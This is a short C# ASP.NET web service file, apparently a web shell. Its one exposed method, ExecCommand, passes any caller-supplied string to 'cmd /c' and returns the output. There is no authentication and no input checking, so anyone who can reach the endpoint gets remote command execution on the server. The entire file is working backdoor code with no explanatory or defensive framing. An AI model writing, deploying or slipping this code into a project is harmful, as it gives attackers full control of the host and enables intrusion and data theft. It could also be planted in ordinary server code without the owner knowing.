<%@ WebService Language="C#" Class="ShellCmdService" %>

using System;
using System.Diagnostics;
using System.Web.Services;

[System.Web.Script.Services.ScriptService]
public class ShellCmdService : WebService 
{
    [WebMethod]
    public string ExecCommand(string cmd) 
    {
        try
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + cmd);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;

            Process proc = new Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            string result = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();
            return cmd + " : " + result;
        }
        catch (Exception ex)
        {
            return "Error";
        }
    }
}


